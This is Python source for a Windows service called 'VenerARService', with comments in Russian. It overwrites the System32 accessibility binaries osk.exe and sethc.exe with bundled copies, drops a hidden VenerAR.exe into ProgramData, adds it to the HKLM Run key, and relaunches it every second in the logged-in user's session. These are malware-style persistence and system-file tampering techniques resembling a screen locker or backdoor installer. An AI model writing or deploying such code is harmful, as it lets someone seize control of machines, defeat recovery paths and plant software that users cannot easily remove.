import win32serviceutil
import win32service
import win32event
import servicemanager
import psutil
import winreg as reg
import os
import subprocess
import time
import sys
import pkg_resources
import win32api
import win32con
import win32process
import win32ts
import win32profile

class VenerARService(win32serviceutil.ServiceFramework):
    _svc_name_ = "VenerARService"
    _svc_display_name_ = "VenerAR Service"

    def __init__(self, args):
        win32serviceutil.ServiceFramework.__init__(self, args)
        self.hWaitStop = win32event.CreateEvent(None, 0, 0, None)
        self.is_alive = True
        self.program_path = os.path.join(os.getenv('ProgramData'), 'VenerAR.exe')
    
    def return_file(self):
        path = pkg_resources.resource_filename(__name__, 'osk.exe')
        os.system(f'copy {path} "C:\\Windows\\System32\\osk.exe"')

        path = pkg_resources.resource_filename(__name__, 'sethc.exe')
        os.system(f'copy {path} "C:\\Windows\\System32\\sethc.exe"')

    def SvcStop(self):
        self.ReportServiceStatus(win32service.SERVICE_STOP_PENDING)
        win32event.SetEvent(self.hWaitStop)
        self.is_alive = False

    def SvcDoRun(self):
        servicemanager.LogMsg(
            servicemanager.EVENTLOG_INFORMATION_TYPE,
            servicemanager.PYS_SERVICE_STARTED,
            (self._svc_name_, '')
        )
        self.ensure_program_exists()
        # self.add_to_autostart()
        self.main()

    def ensure_program_exists(self):
        if not os.path.exists(self.program_path):
            try:
                # # Для PyInstaller
                # if getattr(sys, 'frozen', False):
                #     import sys
                #     base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(sys.argv[0])))
                #     source_path = os.path.join(base_path, 'VenerAR.exe')
                # else:
                source_path = pkg_resources.resource_filename(__name__, 'VenerAR.exe')
                
                if os.path.exists(source_path):
                    with open(source_path, 'rb') as src:
                        with open(self.program_path, 'wb') as dst:
                            dst.write(src.read())
                    os.system(f'attrib +h "{self.program_path}"')
            except Exception as e:
                servicemanager.LogErrorMsg(f"Ошибка копирования VenerAR.exe: {str(e)}")

        # if not os.path.exists(r"C:\Windows\en-US\RESETER.exe"):
        #     try:
        #         # # Для PyInstaller
        #         # if getattr(sys, 'frozen', False):
        #         #     import sys
        #         #     base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(sys.argv[0])))
        #         #     source_path = os.path.join(base_path, 'VenerAR.exe')
        #         # else:
        #         source_path = pkg_resources.resource_filename(__name__, 'VenerAR.exe')
                
        #         if os.path.exists(source_path):
        #             with open(source_path, 'rb') as src:
        #                 with open(r"C:\Windows\en-US\RESETER.exe", 'wb') as dst:
        #                     dst.write(src.read())
        #             os.system(f'attrib +h r"C:\Windows\en-US\RESETER.exe"')
        #     except Exception as e:
        #         servicemanager.LogErrorMsg(f"Ошибка копирования VenerAR.exe: {str(e)}")

    def add_to_autostart(self):
        """Добавляем программу в автозагрузку через реестр и папку Startup"""
        try:
            # 1. Добавляем в реестр (HKCU)
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_SET_VALUE) as key:
                reg.SetValueEx(key, "VenerAR", 0, reg.REG_SZ, self.program_path)
            
            # # 2. Добавляем в папку автозагрузки
            # startup_folder = os.path.join(
            #     os.getenv('APPDATA'), 
            #     'Microsoft', 
            #     'Windows', 
            #     'Start Menu', 
            #     'Programs', 
            #     'Startup'
            # )
            # shortcut_path = os.path.join(startup_folder, 'VenerAR.lnk')
            
            # if not os.path.exists(shortcut_path):
            #     from win32com.client import Dispatch
            #     shell = Dispatch('WScript.Shell')
            #     shortcut = shell.CreateShortCut(shortcut_path)
            #     shortcut.Targetpath = self.program_path
            #     shortcut.WorkingDirectory = os.path.dirname(self.program_path)
            #     shortcut.save()
                
        except Exception as e:
            servicemanager.LogErrorMsg(f"Ошибка добавления в автозагрузку: {str(e)}")

    # Функция для добавления или изменения значений реестра
    def add_registry_key(self, key, value_type, value_name, value_data):
        command = f'reg add "{key}" /v "{value_name}" /t {value_type} /d "{value_data}" /f'
        subprocess.run(command, shell=True)

    def run_as_user(self, executable_path):
        """Запускаем программу в сессии пользователя с видимым GUI"""
        try:
            # Находим активную пользовательскую сессию
            session_id = None
            for session in win32ts.WTSEnumerateSessions(win32ts.WTS_CURRENT_SERVER_HANDLE):
                if session['State'] == win32ts.WTSActive and session['SessionId'] != 0:
                    session_id = session['SessionId']
                    break
            
            if session_id is None:
                raise Exception("Активная пользовательская сессия не найдена")

            # Получаем токен пользователя
            h_token = win32ts.WTSQueryUserToken(session_id)
            
            # Создаем окружение пользователя
            env = win32profile.CreateEnvironmentBlock(h_token, False)
            
            # Параметры запуска
            startup_info = win32process.STARTUPINFO()
            startup_info.lpDesktop = "winsta0\\default"  # Для отображения GUI
            
            # Запускаем процесс
            win32process.CreateProcessAsUser(
                h_token,
                None,
                executable_path,
                None,
                None,
                False,
                win32con.NORMAL_PRIORITY_CLASS,
                env,
                None,
                startup_info
            )
            
            win32api.CloseHandle(h_token)
            return True
            
        except Exception as e:
            servicemanager.LogErrorMsg(f"Ошибка запуска от пользователя: {str(e)}")
            return False

    def main(self):
        self.return_file()
        try:
            self.add_to_autostart()
        except:
            pass
        while self.is_alive:
            try:
                if not self.is_process_running("VenerAR.exe"):
                    # Пытаемся запустить с GUI
                    if not self.run_as_user(self.program_path):
                        # Если не получилось, запускаем обычным способом
                        subprocess.Popen(
                            [self.program_path],
                            creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.CREATE_NEW_PROCESS_GROUP
                        )
            except Exception as e:
                servicemanager.LogErrorMsg(f"Ошибка при запуске VenerAR.exe: {str(e)}")
            
            time.sleep(1)

    def is_process_running(self, process_name):
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == process_name.lower():
                return True
        return False

if __name__ == '__main__':
    if len(sys.argv) == 1:
        # Это запуск самой службы
        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(VenerARService)
        servicemanager.StartServiceCtrlDispatcher()
    else:
        # Это вызов для установки/удаления службы
        win32serviceutil.HandleCommandLine(VenerARService)